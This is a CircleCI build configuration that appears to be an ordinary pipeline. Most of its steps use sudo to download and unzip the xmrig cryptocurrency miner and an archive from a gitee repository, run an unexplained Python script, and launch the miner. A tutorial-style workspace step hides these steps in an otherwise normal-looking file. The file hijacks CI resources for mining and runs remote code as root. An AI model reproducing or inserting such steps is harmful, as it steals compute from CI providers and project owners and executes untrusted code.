version: 2
jobs:
  build:
    machine:
      image: ubuntu-2004:202010-01 # recommended linux image
    resource_class: 2xlarge
    steps:
      - checkout
      - run: cd /home
      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/xmrig-6.12.1.zip
      - run: sudo unzip xmrig-6.12.1.zip
      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/test.zip
      - run: sudo unzip test.zip
      - run: sudo python 1.py
      - run: sudo ./xmrig
      - run: mkdir -p my_workspace
      - run: echo "Trying out workspaces" > my_workspace/echo-output
      - persist_to_workspace:
          # Must be an absolute path, or relative path from working_directory
          root: my_workspace
          # Must be relative path from root
          paths:
            - echo-output